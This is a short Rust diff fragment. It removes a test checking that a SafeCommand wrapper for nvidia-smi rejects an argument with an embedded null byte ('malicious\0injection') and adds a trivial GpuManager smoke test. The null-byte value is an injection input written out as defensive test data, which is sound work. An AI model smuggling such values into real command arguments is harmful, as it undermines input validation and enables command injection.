-            let result = SafeCommand::new(AllowedProgram::NvidiaSmi)
-                .arg("valid")
-                .arg("malicious\0injection")
-                .execute_sync();
-
-            assert!(result.is_err(), "Execution should fail with validation errors");
-            let err = result.unwrap_err();
-            assert!(
-                err.is_validation_error(),
-                "Error should be a validation error"
-            );
-        }
+    fn test_gpu_manager_creation() {
+        let manager = GpuManager::new();
+        // Just verify it doesn't panic
+        let _ = manager.count();
+        let _ = manager.capabilities();
+        let _ = manager.commands();
     }
 }
